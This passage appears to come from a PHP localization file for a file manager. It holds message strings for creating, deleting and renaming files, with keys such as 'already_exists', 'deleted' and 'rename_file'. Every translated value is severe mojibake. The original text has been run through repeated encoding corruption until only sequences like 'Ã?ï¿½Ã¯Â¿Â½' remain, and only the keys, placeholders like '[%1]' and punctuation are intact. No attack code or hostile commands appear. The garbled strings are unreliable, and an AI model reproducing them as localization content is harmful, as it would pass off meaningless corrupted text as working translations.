½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.',
'already_exists' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.',
'created' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.',
'not_created' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.',
'really_delete' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½?',
'deleted' => "Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½:\n[%1]",
'not_deleted' => "Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½:\n[%1]",
'rename_file' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â°Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½:',
